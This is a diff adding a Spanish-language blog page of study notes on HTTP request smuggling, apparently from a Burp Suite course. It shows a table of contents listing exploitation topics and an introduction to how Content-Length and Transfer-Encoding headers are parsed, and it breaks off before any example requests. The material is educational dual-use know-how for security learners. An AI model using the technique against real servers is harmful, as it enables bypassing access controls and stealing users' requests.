@@ -1,0 +1,1905 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>21. HTTP Request Smuggling.</title>
+
+  
+  <meta name="author" content="Qv1nTv5">
+  
+
+  <meta name="description" content="Detección y explotación de vulnerabilidades de contrabando de solicitudes través de la herramienta BurpSuite.">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Home">
+  <meta property="og:title" content="21. HTTP Request Smuggling.">
+  <meta property="og:description" content="Detección y explotación de vulnerabilidades de contrabando de solicitudes través de la herramienta BurpSuite.">
+
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Qv1nTv5">
+  <meta property="og:article:published_time" content="2022-03-26T00:00:00-04:00">
+  <meta property="og:url" content="http://localhost:4000/2022-03-26-21.HTTP_request_smuggling/">
+  <link rel="canonical" href="http://localhost:4000/2022-03-26-21.HTTP_request_smuggling/">
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:site" content="@Qvintvs1">
+  <meta name="twitter:creator" content="@Qvintvs1">
+
+  <meta property="twitter:title" content="21. HTTP Request Smuggling.">
+  <meta property="twitter:description" content="Detección y explotación de vulnerabilidades de contrabando de solicitudes través de la herramienta BurpSuite.">
+
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+
+  
+
+
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/Cpage">C</a>
+                  <a class="dropdown-item" href="/DHARMApage">Dharma</a>
+            </div>
+          </li>
+        
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
+                  <a class="dropdown-item" href="/THMpage">Thm</a>
+                  <a class="dropdown-item" href="/HackTheBoxpage">Htb</a>
+                  <a class="dropdown-item" href="/PEN200page">BasicPentesting</a>
+                  <a class="dropdown-item" href="/REDTEAMBASICSpage">RedTeam</a>
+                  <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
+                  <a class="dropdown-item" href="/REDESpage">Net</a>
+                  <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
+            </div>
+          </li>
+        
+        <li class="nav-item">
+          <a class="nav-link" id="nav-search-link" href="#" title="Search">
+            <span id="nav-search-icon" class="fa fa-search"></span>
+            <span id="nav-search-text">Search</span>
+          </a>
+        </li></ul>
+  </div>
+
+  
+
+  
+
+</nav>
+
+
+
+<div id="beautifuljekyll-search-overlay">
+
+  <div id="nav-search-exit" title="Exit search">✕</div>
+  <input type="text" id="nav-search-input" placeholder="Search">
+  <ul id="search-results-container"></ul>
+  
+  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
+  <script>
+    var searchjson = '[ \
+       \
+        { \
+          "title"    : "2. Constants and Literals in C.", \
+          "category" : "C", \
+          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
+          "date"     : "December 10, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "1. Basics of C", \
+          "category" : "C", \
+          "url"      : "/2024-12-02-1.BasicsOfC/", \
+          "date"     : "December  2, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "DHA", \
+          "url"      : "/2024-09-24-Dharma_Tutorial/", \
+          "date"     : "September 24, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "fuzz", \
+          "url"      : "/2024-03-22-Dharma_Tutorial-copy/", \
+          "date"     : "March 22, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Mi experiencia con el OSCP", \
+          "category" : "pen", \
+          "url"      : "/2023-11-19-PEN200_Experience/", \
+          "date"     : "November 19, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Client Side", \
+          "category" : "pen", \
+          "url"      : "/2023-11-17-17.Client_Side_Attacks/", \
+          "date"     : "November 17, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Deep Packet Tunneling", \
+          "category" : "pen", \
+          "url"      : "/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/", \
+          "date"     : "November 16, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Report", \
+          "category" : "pen", \
+          "url"      : "/2023-11-15-15.Making_Reports/", \
+          "date"     : "November 15, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "pen", \
+          "url"      : "/2023-11-14-14.Metasploit/", \
+          "date"     : "November 14, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Password Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-13-13.Password_Attacks/", \
+          "date"     : "November 13, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Active Directory Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-12-12.Active_Directory_Attacks/", \
+          "date"     : "November 12, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Port Forwarding", \
+          "category" : "pen", \
+          "url"      : "/2023-11-11-11.Port_Forwarding/", \
+          "date"     : "November 11, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Privilege Escalation", \
+          "category" : "pen", \
+          "url"      : "/2023-11-10-10.Privilege_Escalation/", \
+          "date"     : "November 10, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "File Transfers", \
+          "category" : "pen", \
+          "url"      : "/2023-11-09-9.File_Tranfers/", \
+          "date"     : "November  9, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Buffer Overflows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-08-8.Buffer_Overflows/", \
+          "date"     : "November  8, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Vulnerability Scanning.", \
+          "category" : "pen", \
+          "url"      : "/2023-11-07-7.Vulnerability_Scanning/", \
+          "date"     : "November  7, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Information Gathering", \
+          "category" : "pen", \
+          "url"      : "/2023-11-06-6.Active_Information_Gathering/", \
+          "date"     : "November  6, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Windows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-05-5.Windows/", \
+          "date"     : "November  5, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Networking", \
+          "category" : "pen", \
+          "url"      : "/2023-11-04-4.Networking/", \
+          "date"     : "November  4, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Scripting", \
+          "category" : "pen", \
+          "url"      : "/2023-11-03-3.Scripting/", \
+          "date"     : "November  3, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Practical Tools", \
+          "category" : "pen", \
+          "url"      : "/2023-11-02-2.PracticalTools/", \
+          "date"     : "November  2, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Linux", \
+          "category" : "pen", \
+          "url"      : "/2023-11-01-1.Linux/", \
+          "date"     : "November  1, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Easy", \
+          "category" : "hack", \
+          "url"      : "/2022-12-01-Easy/", \
+          "date"     : "December  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Git Basics", \
+          "category" : "", \
+          "url"      : "/2022-11-17-GitBasics/", \
+          "date"     : "November 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier I", \
+          "category" : "hack", \
+          "url"      : "/2022-11-10-Tier_1/", \
+          "date"     : "November 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier 0", \
+          "category" : "hack", \
+          "url"      : "/2022-11-09-Tier_0/", \
+          "date"     : "November  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7.BufferOverflow.", \
+          "category" : "thm", \
+          "url"      : "/2022-11-02-7.BufferOverflow/", \
+          "date"     : "November  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6.Offensive Pentesting", \
+          "category" : "thm", \
+          "url"      : "/2022-11-01-6.OffensivePentesting/", \
+          "date"     : "November  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5.RedTeam", \
+          "category" : "thm", \
+          "url"      : "/2022-10-30-5.RedTeam/", \
+          "date"     : "October 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4.Windows", \
+          "category" : "thm", \
+          "url"      : "/2022-10-22-4.Windows/", \
+          "date"     : "October 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3.Junior Penetrationtester path", \
+          "category" : "thm", \
+          "url"      : "/2022-09-02-3.JRPenetrationTester/", \
+          "date"     : "September  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2.Complete Begginer path.", \
+          "category" : "thm", \
+          "url"      : "/2022-08-07-2.CompleteBegginer/", \
+          "date"     : "August  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1.Pre-Security path.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-11-1Pre-Security/", \
+          "date"     : "July 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "0.Scripting for pentesters.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-10-0.Scripting_for_pentesters/", \
+          "date"     : "July 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Burp Certified Practitioner Practice Exam.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-30-PracticeExam/", \
+          "date"     : "March 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "22. OAuth Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-27-22.OAuth_authentication/", \
+          "date"     : "March 27, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "21. HTTP Request Smuggling.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-26-21.HTTP_request_smuggling/", \
+          "date"     : "March 26, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "20. HTTP Host Header Attacks.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-25-20.HTTP_Host_header_attacks/", \
+          "date"     : "March 25, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "19. Web Cache Poisoning.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-24-19.Web_cache_poisoning/", \
+          "date"     : "March 24, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "18. Server-Side Template Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-23-18.Serve-side_template_injection/", \
+          "date"     : "March 23, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "17. Insecure Deserialization.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-22-17.Insecure_deserialization/", \
+          "date"     : "March 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "16. WebSockets.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-21-16.WebSockets/", \
+          "date"     : "March 21, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "15.DOM-based XSS vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-20-15-DOM-based_vulnerabilities/", \
+          "date"     : "March 20, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "14. Clickjacking.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-19-14.Clickjacking/", \
+          "date"     : "March 19, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "13. Cross-Origin Resource Sharing.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/", \
+          "date"     : "March 18, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "12. Cross-Site Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-17-12.Cross-site_request_forgery_(CSRF)/", \
+          "date"     : "March 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "11. Cross-Site Scripting.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-16-11.Cross-site_scripting_(XSS)/", \
+          "date"     : "March 16, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "10. XXE Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-15-10.XXE_injection/", \
+          "date"     : "March 15, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "9. Server-Side Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-14-9.Server-side_request_forgery/", \
+          "date"     : "March 14, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "8. File Upload.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-13-8.File_upload_vulnerabilities/", \
+          "date"     : "March 13, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7. Access Control.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-12-7.Access_control/", \
+          "date"     : "March 12, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6. Information Disclosure.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-11-6.Information_disclosure/", \
+          "date"     : "March 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5. Bussiness Logic Vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-10-5.Business_logic_vulnerabilities/", \
+          "date"     : "March 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4. Command Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-09-4.Command_Injection/", \
+          "date"     : "March  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3. Directory Traversal.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-08-3.Directory_Traversal/", \
+          "date"     : "March  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2. Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-07-2.Authentication/", \
+          "date"     : "March  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1. SQLInjection", \
+          "category" : "burp", \
+          "url"      : "/2022-03-06-1.SQLInjection/", \
+          "date"     : "March  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Seguridad Perimetral", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Seguridad_Perimetral/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Hardening de sistemas", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Hardening_de_sistemas/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Bandit", \
+          "category" : "otw", \
+          "url"      : "/2022-02-08-Bandit/", \
+          "date"     : "February  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Proxy", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Proxys/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Protocolos Relevantes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Protocolos_Importantes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Curso Básico Redes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Precurso_Redes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "IPs", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-IPs/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Movimientos Laterales", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-06-Introducci%C3%B3n_a_movimientos_laterales/", \
+          "date"     : "February  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Evasión de Defensas", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Evasi%C3%B3n_de_Defensas/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Escalada de privilegios", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Escalada_de_privilegios/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-04-Metasploit_B%C3%A1sico/", \
+          "date"     : "February  4, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a aplicaciones Android", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-03-Ataques_aplicaciones_android/", \
+          "date"     : "February  3, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataque a aplicaciones web.", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-02-Ataques_a_aplicaciones_web/", \
+          "date"     : "February  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a Infraestructuras y Redes", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-01-Ataques_a_Infraestructuras_y_Redes/", \
+          "date"     : "February  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Análisis de Objetivos", \
+          "category" : "redteam", \
+          "url"      : "/2022-01-28-An%C3%A1lisis_de_Objetivos/", \
+          "date"     : "January 28, 2022" \
+        }, \
+       \
+       \
+        { \
+          "title"    : "Blueteam Basics", \
+          "category" : "page", \
+          "url"      : "/BLUETEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PortSwigger BurpSuite Course", \
+          "category" : "page", \
+          "url"      : "/BURPSUITEpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "C programming subjects.", \
+          "category" : "page", \
+          "url"      : "/Cpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Dharma Fuzzer language", \
+          "category" : "page", \
+          "url"      : "/DHARMApage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Exploiting &amp; Reversing", \
+          "category" : "page", \
+          "url"      : "/EXPREVpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Fuzzing JavaScript Engine", \
+          "category" : "page", \
+          "url"      : "/Fuzzpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "HackTheBox", \
+          "category" : "page", \
+          "url"      : "/HackTheBoxpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PEN200 notes", \
+          "category" : "page", \
+          "url"      : "/PEN200page/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Proyectos", \
+          "category" : "page", \
+          "url"      : "/PROJECTSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Networking Basics", \
+          "category" : "page", \
+          "url"      : "/REDESpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "RedTeam Basics", \
+          "category" : "page", \
+          "url"      : "/REDTEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Retired Machines", \
+          "category" : "page", \
+          "url"      : "/RetiredMachinespage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "TryHackMe", \
+          "category" : "page", \
+          "url"      : "/THMpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "About me", \
+          "category" : "page", \
+          "url"      : "/aboutme/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "THM", \
+          "category" : "page", \
+          "url"      : "/preOSCPpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Tag Index", \
+          "category" : "page", \
+          "url"      : "/tags/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page2/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page3/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page4/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page5/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page6/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page7/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page8/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page9/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page10/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page11/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page12/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page13/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page14/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page15/", \
+          "date"     : "January 1, 1970" \
+        } \
+       \
+    ]';
+    searchjson = JSON.parse(searchjson);
+
+    var sjs = SimpleJekyllSearch({
+      searchInput: document.getElementById('nav-search-input'),
+      resultsContainer: document.getElementById('search-results-container'),
+      json: searchjson
+    });
+  </script>
+</div>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>21. HTTP Request Smuggling.</h1>
+          
+            
+              <h2 class="post-subheading">Detección y explotación de vulnerabilidades de contrabando de solicitudes través de la herramienta BurpSuite.</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on March 26, 2022</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <h2 id="0-índice">0. Índice.</h2>
+
+<ul>
+  <li>1 Planteamiento del concepto.
+    <ul>
+      <li>1.1. Introducción.</li>
+      <li>1.2. Proceso al detalle.</li>
+    </ul>
+  </li>
+  <li>2 Planteamiento de la vulnerabilidad.</li>
+  <li>3 Ejecutando el ataque.
+    <ul>
+      <li>3.2. Vulnerabilidades CL.TE.</li>
+      <li>3.3. TE.CL Vulnerabilities.</li>
+      <li>3.4. TE.TE. Ofuscación de la cabecera TE.</li>
+    </ul>
+  </li>
+  <li>4 Identificación de vulnerabilidades HTTP request smuggling.
+    <ul>
+      <li>4.1. Técnicas basadas en sincronización.</li>
+      <li>4.2. Confirmación de vulnerabilidades.</li>
+    </ul>
+  </li>
+  <li>5 Exploiting HTTP Request Smuggling.
+    <ul>
+      <li>5.1. Bypass front-end security controls.</li>
+      <li>5.2. Revealing front-end request rewriting.</li>
+      <li>5.3. Capturando requests de otros usuarios.</li>
+      <li>5.4. Using HTTP Request smuggler to perfom XSS attacks.</li>
+    </ul>
+  </li>
+  <li>6 Advanced HTTP Request Smuggling y HTTP/2 Request Smuggling.
+    <ul>
+      <li>6.1. Introducción.</li>
+      <li>6.2. HTTP/2 message length.</li>
+      <li>6.3. HTTP/2 Downgrading.</li>
+      <li>6.4. Vulnerabilidades.
+        <ul>
+          <li>6.4.1. Vulnerabilidades H2.CL.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="1-planteamiento-del-concepto">1. Planteamiento del concepto.</h3>
+
+<h4 id="11-introducción">1.1. Introducción.</h4>
+
+<p>El <strong>HTTP request smuggling</strong> es una técnica para interferir con la forma en la que un sitio web procesa secuencias de HTTP request que se reciben de uno o más usuarios. </p>
+
+<p>Las vulnerabilidades de este tipo suelen ser críticas. Permite a un atacante eludir los controles de seguridad, obtener acceso no autorizado a datos confidenciales y comprometer directamente a otros usuarios de la aplicación.</p>
+
+<p><br /></p>
+
+<h4 id="12-proceso-al-detalle">1.2. Proceso al detalle.</h4>
+
+<p>Las aplicaciones web actuales emplean, con frecuencia, cadenas de servidores HTTP entre los usuarios y el punto final del back-end (server-chains). </p>
+
+<p>Los usuarios envían solicitudes a un servidor front-end (a veces denominado equilibrador de carga o proxy inverso) y este servidor reenvía las solicitudes a uno o más servidores back-end, es último normalmente envía varias solicitudes en batería a través de la misma conexión de red. </p>
+
+<p>El mecanismo es muy simple: <strong>las solicitudes HTTP se envían una tras otra y el servidor receptor analiza diversos “headers” de las solicitudes HTTP para determinar dónde termina una solicitud y comienza la siguiente</strong>:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220514110120.png" text-align="center" />
+</div>
+
+<p>Si este sistema estuviera mal implementado y los distintos servidores no tuvieran un protocolo de actuación coordinado, un atacante podría envair una solicitud ambigua que confunda a la cadena de servidores con consecuencias fatales:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220514110509.png" text-align="center" />
+</div>
+
+<p><strong>Para todo esto hay que recordar que la transmisión de información se basa en bytes. Cuando se envían varias request los paquetes de bytes pertenecientes a ambaras request viajan juntos en batería. El mecanismo de confusión del request smuggling se basa en engañar al servidor para que tome bytes de un request asumiendo que son de otra request contaminando así el contenido de la misma.</strong></p>
+
+<p><br /></p>
+
+<h3 id="2-planteamiento-de-la-vulnerabilidad">2. Planteamiento de la vulnerabilidad.</h3>
+
+<p>Fundamentalmente, los servidores emplean dos headers para saber cuál es el final de una request:</p>
+
+<ul>
+  <li>
+    <p><strong>Content-Length</strong>: Especifica el número de bytes contenidos en el cuerpo del menasje.</p>
+  </li>
+  <li>
+    <p><strong>Transfer-Encoding</strong>: El encabezado Transfer-Encoding se puede usar para especificar que el cuerpo del mensaje usa codificación fragmentada. <strong>Esto significa que el cuerpo del mensaje contiene uno o más fragmentos de datos</strong>. Cada fragmento consta del tamaño del fragmento en bytes (expresado en hexadecimal), seguido de una nueva línea, seguido del contenido del fragmento. <strong>El mensaje se termina con un trozo que contiene únicamente el cero</strong>.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Nota:</strong></p>
+
+<p><strong>Muchos security testers desconocen que la codificación fragmentada se puede usar en solicitudes HTTP, por dos razones:</strong></p>
+
+<ul>
+  <li>
+    <p>Burp Suite desempaqueta automáticamente la codificación fragmentada para que los mensajes sean más fáciles de ver y editar.**</p>
+  </li>
+  <li>
+    <p><strong>Los navegadores normalmente no usan codificación fragmentada en las solicitudes, y normalmente solo se ve en las respuestas del servidor.</strong></p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<p>Así, como hay dos métodos de especificación del tamaño de la request, es posible para en un mismo mensaje emplear los dos métodos a la vez.</p>
+
+<p>Para prevenir los posibles problemas que puedan venir derivados de esta situación, si ambas cabeceras están presentes, entonces la cabecera Content-Length es ignorada y aunque esto pueda ser suficiente para un sólo servidor, no lo es cuando interviene en el envío de la request una cadena de servidores.</p>
+
+<p>Esto es debido a que:</p>
+
+<ul>
+  <li>
+    <p>Algunos servidores no adminten la cabecera <em>Transfer-Encoding</em>.</p>
+  </li>
+  <li>
